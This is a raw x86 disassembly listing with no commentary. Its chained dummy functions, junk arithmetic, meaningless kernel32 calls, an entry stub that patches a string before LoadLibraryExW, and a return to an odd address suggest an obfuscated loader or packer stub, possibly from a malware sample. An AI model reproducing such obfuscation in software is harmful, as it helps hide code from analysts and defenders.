0x004d0000:	movl	%edi, %edi	; from: 0x004d0841(MAY)
0x004d0002:	pushl	%ebp
0x004d0003:	movl	%esp, %ebp
0x004d0005:	subl	$0x3c, %esp
0x004d0008:	movl	$0x4d31d0, %edx
0x004d000d:	cmpl	$0x6a96, %edx
0x004d0013:	jbe	0x004d0003	; targets: 0x004d0015(MAY)
0x004d0015:	pushl	%edx	; from: 0x004d0013(MAY)
0x004d0016:	pushl	$0x0
0x004d0018:	call	TlsGetValue@kernel32.dll	; targets: 0xff0000d0(MAY)
0x004d001e:	popl	%edx
0x004d001f:	pushl	%edx
0x004d0020:	pushl	%esi
0x004d0021:	pushl	%eax
0x004d0022:	pushl	0x90(%edx)
0x004d0028:	pushl	0x64(%edx)
0x004d002b:	call	0x004d05fc	; targets: 0x004d05fc(MAY)
0x004d0048:	movl	%edi, %edi	; from: 0x004d0431(MAY)
0x004d004a:	pushl	%ebp
0x004d004b:	movl	%esp, %ebp
0x004d004d:	subl	$0x30, %esp
0x004d0050:	leal	-40(%edx), %edi
0x004d0053:	orl	$0xffffffaa, 0x44(%edi)
0x004d0057:	movl	$0x0, %ecx
0x004d005c:	pushl	%ecx
0x004d005d:	call	FindClose@kernel32.dll	; targets: 0xff000260(MAY)
0x004d0063:	pushl	%edi
0x004d0064:	pushl	%eax
0x004d0065:	pushl	0x10c(%edi)
0x004d006b:	call	0x004d05b8	; targets: 0x004d05b8(MAY)
0x004d008c:	movl	%edi, %edi	; from: 0x004d04d9(MAY)
0x004d008e:	pushl	%ebp
0x004d008f:	movl	%esp, %ebp
0x004d0091:	subl	$0x58, %esp
0x004d0094:	movl	$0x4d316c, %edx
0x004d0099:	cmpl	$0x528d, %edx
0x004d009f:	je	0x004d008f	; targets: 0x004d00a1(MAY)
0x004d00a1:	pushl	%edx	; from: 0x004d009f(MAY)
0x004d00a2:	pushl	%edi
0x004d00a3:	pushl	0x1b8(%edx)
0x004d00a9:	call	0x004d0a7c	; targets: 0x004d0a7c(MAY)
0x004d00d8:	movl	%edi, %edi	; from: 0x004d02c9(MAY)
0x004d00da:	pushl	%ebp
0x004d00db:	movl	%esp, %ebp
0x004d00dd:	subl	$0x28, %esp
0x004d00e0:	leal	0x158(%eax), %ebx
0x004d00e6:	andl	-12(%ebp), %eax
0x004d00e9:	pushl	$0x0
0x004d00eb:	call	GlobalFree@kernel32.dll	; targets: 0xff000160(MAY)
0x004d00f1:	pushl	%ebx
0x004d00f2:	pushl	0x170(%ebx)
0x004d00f8:	pushl	%edi
0x004d00f9:	pushl	%eax
0x004d00fa:	call	0x004d079c	; targets: 0x004d079c(MAY)
0x004d0110:	movl	%edi, %edi	; from: 0x004d0777(MAY)
0x004d0112:	pushl	%ebp
0x004d0113:	movl	%esp, %ebp
0x004d0115:	subl	$0x58, %esp
0x004d0118:	leal	0x004d30ec, %eax
0x004d011e:	andl	$0xffff9c23, -84(%eax)
0x004d0125:	pushl	%eax
0x004d0126:	pushl	%esi
0x004d0127:	pushl	0xe8(%eax)
0x004d012d:	call	0x004d0338	; targets: 0x004d0338(MAY)
0x004d015c:	movl	%edi, %edi	; from: 0x004d0547(MAY)
0x004d015e:	pushl	%ebp
0x004d015f:	movl	%esp, %ebp
0x004d0161:	subl	$0x2c, %esp
0x004d0164:	leal	0x004d3140, %edi
0x004d016a:	orl	%esi, %ecx
0x004d016c:	pushl	%edi
0x004d016d:	pushl	%ecx
0x004d016e:	pushl	0x1e4(%edi)
0x004d0174:	pushl	%ebx
0x004d0175:	call	0x004d02a4	; targets: 0x004d02a4(MAY)
0x004d0198:	movl	%edi, %edi	; from: 0x004d0c74(MAY)
0x004d019a:	pushl	%ebp
0x004d019b:	movl	%esp, %ebp
0x004d019d:	subl	$0x44, %esp
0x004d01a0:	leal	0x48(%eax), %ecx
0x004d01a3:	subl	%eax, 0x190(%ecx)
0x004d01a9:	pushl	%ecx
0x004d01aa:	call	GetLastError@kernel32.dll	; targets: 0xff000120(MAY)
0x004d01b0:	popl	%ecx
0x004d01b1:	pushl	%ecx
0x004d01b2:	pushl	%ebx
0x004d01b3:	pushl	%edi
0x004d01b4:	pushl	0x1ec(%ecx)
0x004d01ba:	call	0x004d0898	; targets: 0x004d0898(MAY)
0x004d01d8:	movl	%edi, %edi	; from: 0x004d0aa4(MAY)
0x004d01da:	pushl	%ebp
0x004d01db:	movl	%esp, %ebp
0x004d01dd:	subl	$0x2c, %esp
0x004d01e0:	leal	0x004d31ec, %ecx
0x004d01e6:	cmpl	$0x683b, %ecx
0x004d01ec:	jb	0x004d01db	; targets: 0x004d01ee(MAY)
0x004d01ee:	pushl	%ecx	; from: 0x004d01ec(MAY)
0x004d01ef:	pushl	%edi
0x004d01f0:	pushl	%edi
0x004d01f1:	pushl	%edx
0x004d01f2:	call	0x004d0acc	; targets: 0x004d0acc(MAY)
0x004d0220:	movl	%edi, %edi	; from: 0x004d0694(MAY)
0x004d0222:	pushl	%ebp
0x004d0223:	movl	%esp, %ebp
0x004d0225:	subl	$0x24, %esp
0x004d0228:	movl	$0x4d316c, %ebx
0x004d022d:	orl	$0x3c, 0x10(%ebx)
0x004d0231:	movl	$0x0, %edx
0x004d0236:	pushl	%edx
0x004d0237:	call	UnmapViewOfFile@kernel32.dll	; targets: 0xff000250(MAY)
0x004d023d:	pushl	%ebx
0x004d023e:	pushl	0xc8(%ebx)
0x004d0244:	pushl	%edi
0x004d0245:	pushl	0x24(%ebx)
0x004d0248:	call	0x004d0820	; targets: 0x004d0820(MAY)
0x004d0264:	movl	%edi, %edi	; from: 0x004d0350(MAY)
0x004d0266:	pushl	%ebp
0x004d0267:	movl	%esp, %ebp
0x004d0269:	subl	$0x30, %esp
0x004d026c:	movl	$0x4d30b4, %esi
0x004d0271:	cmpl	$0x3713, %esi
0x004d0277:	jb	0x004d0267	; targets: 0x004d0279(MAY)
0x004d0279:	pushl	$0x0	; from: 0x004d0277(MAY)
0x004d027b:	call	UnmapViewOfFile@kernel32.dll	; targets: 0xff000250(MAY)
0x004d0281:	pushl	%esi
0x004d0282:	pushl	%ecx
0x004d0283:	pushl	0x160(%esi)
0x004d0289:	pushl	%ebx
0x004d028a:	call	0x004d09b4	; targets: 0x004d09b4(MAY)
0x004d02a4:	movl	%edi, %edi	; from: 0x004d0175(MAY)
0x004d02a6:	pushl	%ebp
0x004d02a7:	movl	%esp, %ebp
0x004d02a9:	subl	$0x4c, %esp
0x004d02ac:	leal	0x004d3058, %eax
0x004d02b2:	sbbl	$0x3d65, %edx
0x004d02b8:	pushl	%eax
0x004d02b9:	movl	$0x0, %esi
0x004d02be:	pushl	%esi
0x004d02bf:	call	LocalUnlock@kernel32.dll	; targets: 0xff000070(MAY)
0x004d02c5:	popl	%eax
0x004d02c6:	pushl	%eax
0x004d02c7:	pushl	%ebx
0x004d02c8:	pushl	%edi
0x004d02c9:	call	0x004d00d8	; targets: 0x004d00d8(MAY)
0x004d02ec:	movl	%edi, %edi	; from: 0x004d08b7(MAY)
0x004d02ee:	pushl	%ebp
0x004d02ef:	movl	%esp, %ebp
0x004d02f1:	subl	$0x1c, %esp
0x004d02f4:	leal	-280(%eax), %edx
0x004d02fa:	xorl	$0x35d2, -12(%ebp)
0x004d0301:	pushl	%edx
0x004d0302:	pushl	$0x0
0x004d0304:	call	FindClose@kernel32.dll	; targets: 0xff000260(MAY)
0x004d030a:	popl	%edx
0x004d030b:	pushl	%edx
0x004d030c:	pushl	%edi
0x004d030d:	pushl	0xe0(%edx)
0x004d0313:	pushl	0x138(%edx)
0x004d0319:	pushl	%ebx
0x004d031a:	call	0x004d0c14	; targets: 0x004d0c14(MAY)
0x004d0338:	movl	%edi, %edi	; from: 0x004d012d(MAY)
0x004d033a:	pushl	%ebp
0x004d033b:	movl	%esp, %ebp
0x004d033d:	subl	$0x44, %esp
0x004d0340:	movl	$0x4d3178, %ebx
0x004d0345:	cmpl	$0x7b0e, %ebx
0x004d034b:	jbe	0x004d033b	; targets: 0x004d034d(MAY)
0x004d034d:	pushl	%ebx	; from: 0x004d034b(MAY)
0x004d034e:	pushl	%esi
0x004d034f:	pushl	%edi
0x004d0350:	call	0x004d0264	; targets: 0x004d0264(MAY)
0x004d0374:	movl	%edi, %edi	; from: 0x004d0b76(MAY)
0x004d0376:	pushl	%ebp
0x004d0377:	movl	%esp, %ebp
0x004d0379:	subl	$0x44, %esp
0x004d037c:	xorl	$0x6a6e, -40(%ebp)
0x004d0383:	leal	0x004d30ac, %ebx
0x004d0389:	movl	$0x6ac, %esi
0x004d038e:	pushl	%esi
0x004d038f:	pushl	$0x6ac
0x004d0394:	movl	$0x40001, %edi
0x004d0399:	pushl	%edi
0x004d039a:	movl	$0x862985c2, %edx
0x004d039f:	pushl	0x7a239a86(%edx)
0x004d03a5:	subl	$0x2, (%esp)
0x004d03a9:	movl	$0x4d2044, %edx
0x004d03ae:	popl	(%edx)
0x004d03b0:	call	LoadLibraryExW@kernel32.dll	; targets: 0xff0001fe(MAY)
0x004d0414:	movl	%edi, %edi	; from: 0x004d0b37(MAY)
0x004d0416:	pushl	%ebp
0x004d0417:	movl	%esp, %ebp
0x004d0419:	subl	$0x20, %esp
0x004d041c:	movl	$0x4d3184, %edx
0x004d0421:	movl	$0xfffff333, 0x28(%edx)
0x004d0428:	pushl	%edx
0x004d0429:	pushl	0x188(%edx)
0x004d042f:	pushl	%edi
0x004d0430:	pushl	%edi
0x004d0431:	call	0x004d0048	; targets: 0x004d0048(MAY)
0x004d045c:	movl	%edi, %edi	; from: 0x004d0bad(MAY)
0x004d045e:	pushl	%ebp
0x004d045f:	movl	%esp, %ebp
0x004d0461:	subl	$0x54, %esp
0x004d0464:	leal	-368(%eax), %edi
0x004d046a:	adcl	$0x7fa1, -48(%ebp)
0x004d0471:	call	GetLastError@kernel32.dll	; targets: 0xff000120(MAY)
0x004d0477:	pushl	%edi
0x004d0478:	pushl	0x44(%edi)
0x004d047b:	pushl	%eax
0x004d047c:	pushl	0x1b0(%edi)
0x004d0482:	call	0x004d0638	; targets: 0x004d0638(MAY)

start:
0x004d04a0:	pushl	$0x0
0x004d04a2:	call	SetLastError@kernel32.dll	; targets: 0xff000270(MAY)
0x004d04a8:	pushl	$0x0
0x004d04aa:	call	Sleep@kernel32.dll	; targets: 0xff000010(MAY)
0x004d04b0:	pushl	$0x2
0x004d04b2:	xorl	%eax, %eax
0x004d04b4:	leal	0x4d3200(,%eax,2), %eax
0x004d04bb:	pushl	$0x0
0x004d04bd:	leal	0xc(%eax), %ecx
0x004d04c0:	addb	$0xffffffb0, (%ecx)
0x004d04c3:	pushl	%eax
0x004d04c4:	nop	
0x004d04c5:	call	LoadLibraryExW@kernel32.dll	; targets: 0xff000230(MAY)
0x004d04cb:	leal	0x3b(%eax), %edx
0x004d04ce:	movl	(%edx), %ecx
0x004d04d0:	movl	0x28(%eax,%ecx), %eax
0x004d04d4:	movb	$0x40, %ah
0x004d04d6:	pusha	
0x004d04d7:	cmpb	%ah, %al
0x004d04d9:	ja	0x004d008c	; targets: 0x004d008c(MAY), 0x004d04df(MAY)
0x004d04df:	popa		; from: 0x004d04d9(MAY)
0x004d04e0:	ret	; targets: 0xfee70000(MAY)

0x004d04f0:	movl	%edi, %edi	; from: 0x004d073c(MAY)
0x004d04f2:	pushl	%ebp
0x004d04f3:	movl	%esp, %ebp
0x004d04f5:	subl	$0x44, %esp
0x004d04f8:	leal	0x138(%edx), %esi
0x004d04fe:	orl	-408(%esi), %edx
0x004d0504:	pushl	%esi
0x004d0505:	pushl	0xec(%esi)
0x004d050b:	pushl	0x4c(%esi)
0x004d050e:	call	0x004d08e0	; targets: 0x004d08e0(MAY)
0x004d0530:	movl	%edi, %edi	; from: 0x004d0a0e(MAY)
0x004d0532:	pushl	%ebp
0x004d0533:	movl	%esp, %ebp
0x004d0535:	subl	$0x58, %esp
0x004d0538:	movl	$0x4d304c, %ebx
0x004d053d:	xorl	%edi, %edx
0x004d053f:	pushl	%ebx
0x004d0540:	pushl	0x1ac(%ebx)
0x004d0546:	pushl	%edi
0x004d0547:	call	0x004d015c	; targets: 0x004d015c(MAY)
0x004d056c:	movl	%edi, %edi	; from: 0x004d08fa(MAY)
0x004d056e:	pushl	%ebp
0x004d056f:	movl	%esp, %ebp
0x004d0571:	subl	$0x30, %esp
0x004d0574:	movl	$0x4d31b0, %ecx
0x004d0579:	xorl	$0x47c3, -36(%ebp)
0x004d0580:	pushl	%ecx
0x004d0581:	pushl	$0x0
0x004d0583:	call	GlobalFree@kernel32.dll	; targets: 0xff000160(MAY)
0x004d0589:	popl	%ecx
0x004d058a:	pushl	%ecx
0x004d058b:	pushl	0x80(%ecx)
0x004d0591:	pushl	0x188(%ecx)
0x004d0597:	pushl	%eax
0x004d0598:	call	0x004d0b14	; targets: 0x004d0b14(MAY)
0x004d05b8:	movl	%edi, %edi	; from: 0x004d006b(MAY)
0x004d05ba:	pushl	%ebp
0x004d05bb:	movl	%esp, %ebp
0x004d05bd:	subl	$0x54, %esp
0x004d05c0:	leal	0x004d30bc, %eax
0x004d05c6:	addl	-72(%ebp), %edx
0x004d05c9:	pushl	%eax
0x004d05ca:	pushl	0xc8(%eax)
0x004d05d0:	pushl	%ecx
0x004d05d1:	call	0x004d0758	; targets: 0x004d0758(MAY)
0x004d05fc:	movl	%edi, %edi	; from: 0x004d002b(MAY)
0x004d05fe:	pushl	%ebp
0x004d05ff:	movl	%esp, %ebp
0x004d0601:	subl	$0x58, %esp
0x004d0604:	leal	0x004d3150, %ebx
0x004d060a:	andl	$0x3b, %edx
0x004d060d:	pushl	%ebx
0x004d060e:	pushl	0x80(%ebx)
0x004d0614:	pushl	0x3c(%ebx)
0x004d0617:	pushl	0x188(%ebx)
0x004d061d:	pushl	%edi
0x004d061e:	call	0x004d0b54	; targets: 0x004d0b54(MAY)
0x004d0638:	movl	%edi, %edi	; from: 0x004d0482(MAY)
0x004d063a:	pushl	%ebp
0x004d063b:	movl	%esp, %ebp
0x004d063d:	subl	$0x24, %esp
0x004d0640:	leal	0xdc(%edi), %ebx
0x004d0646:	sbbl	%eax, %edx
0x004d0648:	pushl	%ebx
0x004d0649:	pushl	0x15c(%ebx)
0x004d064f:	pushl	0x2c(%ebx)
0x004d0652:	pushl	%edi
0x004d0653:	pushl	0x1b8(%ebx)
0x004d0659:	call	0x004d07d0	; targets: 0x004d07d0(MAY)
0x004d0680:	movl	%edi, %edi	; from: 0x004d0c35(MAY)
0x004d0682:	pushl	%ebp
0x004d0683:	movl	%esp, %ebp
0x004d0685:	subl	$0x60, %esp
0x004d0688:	leal	0x004d3164, %esi
0x004d068e:	xorl	-44(%ebp), %edx
0x004d0691:	pushl	%esi
0x004d0692:	pushl	%edi
0x004d0693:	pushl	%ebx
0x004d0694:	call	0x004d0220	; targets: 0x004d0220(MAY)
0x004d06c0:	movl	%edi, %edi	; from: 0x004d0946(MAY)
0x004d06c2:	pushl	%ebp
0x004d06c3:	movl	%esp, %ebp
0x004d06c5:	subl	$0x30, %esp
0x004d06c8:	leal	0x54(%edx), %eax
0x004d06cb:	cmpl	$0xf28, %eax
0x004d06d0:	je	0x004d06c3	; targets: 0x004d06d2(MAY)
0x004d06d2:	pushl	%eax	; from: 0x004d06d0(MAY)
0x004d06d3:	movl	$0x0, %edi
0x004d06d8:	pushl	%edi
0x004d06d9:	call	GlobalFree@kernel32.dll	; targets: 0xff000160(MAY)
0x004d06df:	popl	%eax
0x004d06e0:	pushl	%eax
0x004d06e1:	pushl	0x144(%eax)
0x004d06e7:	pushl	0x1c0(%eax)
0x004d06ed:	call	0x004d0714	; targets: 0x004d0714(MAY)
0x004d0714:	movl	%edi, %edi	; from: 0x004d06ed(MAY)
0x004d0716:	pushl	%ebp
0x004d0717:	movl	%esp, %ebp
0x004d0719:	subl	$0x40, %esp
0x004d071c:	leal	-44(%eax), %edx
0x004d071f:	andl	%eax, %esi
0x004d0721:	pushl	%edx
0x004d0722:	call	GetACP@kernel32.dll	; targets: 0xff000050(MAY)
0x004d0728:	popl	%edx
0x004d0729:	pushl	%edx
0x004d072a:	pushl	0x138(%edx)
0x004d0730:	pushl	0x158(%edx)
0x004d0736:	pushl	0x1c4(%edx)
0x004d073c:	call	0x004d04f0	; targets: 0x004d04f0(MAY)
0x004d0758:	movl	%edi, %edi	; from: 0x004d05d1(MAY)
0x004d075a:	pushl	%ebp
0x004d075b:	movl	%esp, %ebp
0x004d075d:	subl	$0x58, %esp
0x004d0760:	leal	0x60(%eax), %edx
0x004d0763:	cmpl	$0x1d36, %edx
0x004d0769:	je	0x004d075b	; targets: 0x004d076b(MAY)
0x004d076b:	pushl	%edx	; from: 0x004d0769(MAY)
0x004d076c:	pushl	%eax
0x004d076d:	pushl	0x110(%edx)
0x004d0773:	pushl	%eax
0x004d0774:	pushl	0x38(%edx)
0x004d0777:	call	0x004d0110	; targets: 0x004d0110(MAY)
0x004d079c:	movl	%edi, %edi	; from: 0x004d00fa(MAY)
0x004d079e:	pushl	%ebp
0x004d079f:	movl	%esp, %ebp
0x004d07a1:	subl	$0x40, %esp
0x004d07a4:	leal	-44(%ebx), %edi
0x004d07a7:	movl	%ecx, %ebx
0x004d07a9:	pushl	$0x0
0x004d07ab:	call	GlobalFree@kernel32.dll	; targets: 0xff000160(MAY)
0x004d07b1:	pushl	%edi
0x004d07b2:	pushl	%esi
0x004d07b3:	pushl	%edx
0x004d07b4:	call	0x004d0924	; targets: 0x004d0924(MAY)
0x004d07d0:	movl	%edi, %edi	; from: 0x004d0659(MAY)
0x004d07d2:	pushl	%ebp
0x004d07d3:	movl	%esp, %ebp
0x004d07d5:	subl	$0x54, %esp
0x004d07d8:	leal	0x004d31cc, %edx
0x004d07de:	subl	$0xfffff73d, -384(%edx)
0x004d07e8:	pushl	%edx
0x004d07e9:	pushl	0x98(%edx)
0x004d07ef:	pushl	0xc4(%edx)
0x004d07f5:	pushl	0x104(%edx)
0x004d07fb:	pushl	%esi
0x004d07fc:	call	0x004d0968	; targets: 0x004d0968(MAY)
0x004d0820:	movl	%edi, %edi	; from: 0x004d0248(MAY)
0x004d0822:	pushl	%ebp
0x004d0823:	movl	%esp, %ebp
0x004d0825:	subl	$0x20, %esp
0x004d0828:	movl	$0x4d3038, %eax
0x004d082d:	subl	%eax, %ecx
0x004d082f:	pushl	%eax
0x004d0830:	call	GetACP@kernel32.dll	; targets: 0xff000050(MAY)
0x004d0836:	popl	%eax
0x004d0837:	pushl	%eax
0x004d0838:	pushl	0x118(%eax)
0x004d083e:	pushl	0x24(%eax)
0x004d0841:	call	0x004d0000	; targets: 0x004d0000(MAY)
0x004d0860:	movl	%edi, %edi	; from: 0x004d0989(MAY)
0x004d0862:	pushl	%ebp
0x004d0863:	movl	%esp, %ebp
0x004d0865:	subl	$0x50, %esp
0x004d0868:	leal	-44(%ecx), %esi
0x004d086b:	xorl	$0xfffffff3, -76(%ebp)
0x004d086f:	call	GetACP@kernel32.dll	; targets: 0xff000050(MAY)
0x004d0875:	pushl	%esi
0x004d0876:	pushl	%edi
0x004d0877:	pushl	0x15c(%esi)
0x004d087d:	pushl	%ebx
0x004d087e:	pushl	%eax
0x004d087f:	call	0x004d0bd4	; targets: 0x004d0bd4(MAY)
0x004d0898:	movl	%edi, %edi	; from: 0x004d01ba(MAY)
0x004d089a:	pushl	%ebp
0x004d089b:	movl	%esp, %ebp
0x004d089d:	subl	$0x2c, %esp
0x004d08a0:	leal	0x004d3168, %eax
0x004d08a6:	adcl	$0xffff924a, -200(%eax)
0x004d08b0:	pushl	%eax
0x004d08b1:	pushl	%ebx
0x004d08b2:	pushl	%ecx
0x004d08b3:	pushl	0x5c(%eax)
0x004d08b6:	pushl	%esi
0x004d08b7:	call	0x004d02ec	; targets: 0x004d02ec(MAY)
0x004d08e0:	movl	%edi, %edi	; from: 0x004d050e(MAY)
0x004d08e2:	pushl	%ebp
0x004d08e3:	movl	%esp, %ebp
0x004d08e5:	subl	$0x28, %esp
0x004d08e8:	leal	0x004d31a4, %edx
0x004d08ee:	adcl	%eax, -76(%edx)
0x004d08f1:	pushl	%edx
0x004d08f2:	pushl	%edi
0x004d08f3:	pushl	0x1d0(%edx)
0x004d08f9:	pushl	%ebx
0x004d08fa:	call	0x004d056c	; targets: 0x004d056c(MAY)
0x004d0924:	movl	%edi, %edi	; from: 0x004d07b4(MAY)
0x004d0926:	pushl	%ebp
0x004d0927:	movl	%esp, %ebp
0x004d0929:	subl	$0x20, %esp
0x004d092c:	leal	-308(%edi), %edx
0x004d0932:	orl	-32(%ebp), %esi
0x004d0935:	pushl	%edx
0x004d0936:	call	GetACP@kernel32.dll	; targets: 0xff000050(MAY)
0x004d093c:	popl	%edx
0x004d093d:	pushl	%edx
0x004d093e:	pushl	%ecx
0x004d093f:	pushl	%edi
0x004d0940:	pushl	0xc8(%edx)
0x004d0946:	call	0x004d06c0	; targets: 0x004d06c0(MAY)
0x004d0968:	movl	%edi, %edi	; from: 0x004d07fc(MAY)
0x004d096a:	pushl	%ebp
0x004d096b:	movl	%esp, %ebp
0x004d096d:	subl	$0x48, %esp
0x004d0970:	leal	0x004d3064, %ecx
0x004d0976:	andl	%eax, %edi
0x004d0978:	pushl	%ecx
0x004d0979:	pushl	%edx
0x004d097a:	pushl	0xd8(%ecx)
0x004d0980:	pushl	0xb8(%ecx)
0x004d0986:	pushl	0x10(%ecx)
0x004d0989:	call	0x004d0860	; targets: 0x004d0860(MAY)
0x004d09b4:	movl	%edi, %edi	; from: 0x004d028a(MAY)
0x004d09b6:	pushl	%ebp
0x004d09b7:	movl	%esp, %ebp
0x004d09b9:	subl	$0x24, %esp
0x004d09bc:	leal	0xc(%esi), %edx
0x004d09bf:	movl	%edi, %esi
0x004d09c1:	pushl	%edx
0x004d09c2:	pushl	$0x0
0x004d09c4:	call	SetLastError@kernel32.dll	; targets: 0xff000270(MAY)
0x004d09ca:	popl	%edx
0x004d09cb:	pushl	%edx
0x004d09cc:	pushl	%edi
0x004d09cd:	pushl	%ebx
0x004d09ce:	pushl	0x1c8(%edx)
0x004d09d4:	pushl	0x1e0(%edx)
0x004d09da:	call	0x004d0c58	; targets: 0x004d0c58(MAY)
0x004d09f0:	movl	%edi, %edi	; from: 0x004d0bee(MAY)
0x004d09f2:	pushl	%ebp
0x004d09f3:	movl	%esp, %ebp
0x004d09f5:	subl	$0x30, %esp
0x004d09f8:	leal	0x004d31d4, %ecx
0x004d09fe:	subl	%eax, -44(%ebp)
0x004d0a01:	pushl	%ecx
0x004d0a02:	pushl	0xa0(%ecx)
0x004d0a08:	pushl	0x1bc(%ecx)
0x004d0a0e:	call	0x004d0530	; targets: 0x004d0530(MAY)
0x004d0a3c:	movl	%edi, %edi	; from: 0x004d0ae3(MAY)
0x004d0a3e:	pushl	%ebp
0x004d0a3f:	movl	%esp, %ebp
0x004d0a41:	subl	$0x48, %esp
0x004d0a44:	leal	-84(%edi), %esi
0x004d0a47:	adcl	%esi, 0xb0(%esi)
0x004d0a4d:	movl	$0x0, %edi
0x004d0a52:	pushl	%edi
0x004d0a53:	call	UnmapViewOfFile@kernel32.dll	; targets: 0xff000250(MAY)
0x004d0a59:	pushl	%esi
0x004d0a5a:	pushl	0x1d8(%esi)
0x004d0a60:	pushl	0x150(%esi)
0x004d0a66:	call	0x004d0b8c	; targets: 0x004d0b8c(MAY)
0x004d0a7c:	movl	%edi, %edi	; from: 0x004d00a9(MAY)
0x004d0a7e:	pushl	%ebp
0x004d0a7f:	movl	%esp, %ebp
0x004d0a81:	subl	$0x30, %esp
0x004d0a84:	leal	0x004d318c, %esi
0x004d0a8a:	subl	$0xffffd9fe, %ebx
0x004d0a90:	movl	$0x0, %edi
0x004d0a95:	pushl	%edi
0x004d0a96:	call	LocalUnlock@kernel32.dll	; targets: 0xff000070(MAY)
0x004d0a9c:	pushl	%esi
0x004d0a9d:	pushl	%ecx
0x004d0a9e:	pushl	0x104(%esi)
0x004d0aa4:	call	0x004d01d8	; targets: 0x004d01d8(MAY)
0x004d0acc:	movl	%edi, %edi	; from: 0x004d01f2(MAY)
0x004d0ace:	pushl	%ebp
0x004d0acf:	movl	%esp, %ebp
0x004d0ad1:	subl	$0x34, %esp
0x004d0ad4:	movl	$0x4d3154, %edi
0x004d0ad9:	andl	$0x872, -8(%ebp)
0x004d0ae0:	pushl	%edi
0x004d0ae1:	pushl	%esi
0x004d0ae2:	pushl	%eax
0x004d0ae3:	call	0x004d0a3c	; targets: 0x004d0a3c(MAY)
0x004d0b14:	movl	%edi, %edi	; from: 0x004d0598(MAY)
0x004d0b16:	pushl	%ebp
0x004d0b17:	movl	%esp, %ebp
0x004d0b19:	subl	$0x30, %esp
0x004d0b1c:	movl	$0x4d31d4, %ebx
0x004d0b21:	sbbl	-236(%ebx), %ecx
0x004d0b27:	pushl	$0x0
0x004d0b29:	call	SetLastError@kernel32.dll	; targets: 0xff000270(MAY)
0x004d0b2f:	pushl	%ebx
0x004d0b30:	pushl	%ecx
0x004d0b31:	pushl	0xe4(%ebx)
0x004d0b37:	call	0x004d0414	; targets: 0x004d0414(MAY)
0x004d0b54:	movl	%edi, %edi	; from: 0x004d061e(MAY)
0x004d0b56:	pushl	%ebp
0x004d0b57:	movl	%esp, %ebp
0x004d0b59:	subl	$0x1c, %esp
0x004d0b5c:	movl	$0x4d30f4, %esi
0x004d0b61:	xorl	$0x0, -12(%ebp)
0x004d0b65:	pushl	$0x0
0x004d0b67:	call	GlobalFree@kernel32.dll	; targets: 0xff000160(MAY)
0x004d0b6d:	pushl	%esi
0x004d0b6e:	pushl	%ebx
0x004d0b6f:	pushl	%ecx
0x004d0b70:	pushl	0x1ec(%esi)
0x004d0b76:	call	0x004d0374	; targets: 0x004d0374(MAY)
0x004d0b8c:	movl	%edi, %edi	; from: 0x004d0a66(MAY)
0x004d0b8e:	pushl	%ebp
0x004d0b8f:	movl	%esp, %ebp
0x004d0b91:	subl	$0x34, %esp
0x004d0b94:	leal	0xbc(%esi), %eax
0x004d0b9a:	addl	$0x27d6, -8(%ebp)
0x004d0ba1:	pushl	%eax
0x004d0ba2:	pushl	%ebx
0x004d0ba3:	pushl	0x100(%eax)
0x004d0ba9:	pushl	%edx
0x004d0baa:	pushl	0x48(%eax)
0x004d0bad:	call	0x004d045c	; targets: 0x004d045c(MAY)
0x004d0bd4:	movl	%edi, %edi	; from: 0x004d087f(MAY)
0x004d0bd6:	pushl	%ebp
0x004d0bd7:	movl	%esp, %ebp
0x004d0bd9:	subl	$0x34, %esp
0x004d0bdc:	leal	0x004d3148, %edi
0x004d0be2:	subl	-8(%edi), %edx
0x004d0be5:	pushl	%edi
0x004d0be6:	pushl	%esi
0x004d0be7:	pushl	0x130(%edi)
0x004d0bed:	pushl	%ecx
0x004d0bee:	call	0x004d09f0	; targets: 0x004d09f0(MAY)
0x004d0c14:	movl	%edi, %edi	; from: 0x004d031a(MAY)
0x004d0c16:	pushl	%ebp
0x004d0c17:	movl	%esp, %ebp
0x004d0c19:	subl	$0x58, %esp
0x004d0c1c:	movl	$0x4d3130, %eax
0x004d0c21:	orl	$0x303d, 0xac(%eax)
0x004d0c2b:	pushl	%eax
0x004d0c2c:	pushl	0x44(%eax)
0x004d0c2f:	pushl	0x1c8(%eax)
0x004d0c35:	call	0x004d0680	; targets: 0x004d0680(MAY)
0x004d0c58:	movl	%edi, %edi	; from: 0x004d09da(MAY)
0x004d0c5a:	pushl	%ebp
0x004d0c5b:	movl	%esp, %ebp
0x004d0c5d:	subl	$0x30, %esp
0x004d0c60:	movl	$0x4d3008, %eax
0x004d0c65:	adcl	0xbc(%eax), %edi
0x004d0c6b:	pushl	%eax
0x004d0c6c:	pushl	%esi
0x004d0c6d:	pushl	0x118(%eax)
0x004d0c73:	pushl	%ebx
0x004d0c74:	call	0x004d0198	; targets: 0x004d0198(MAY)
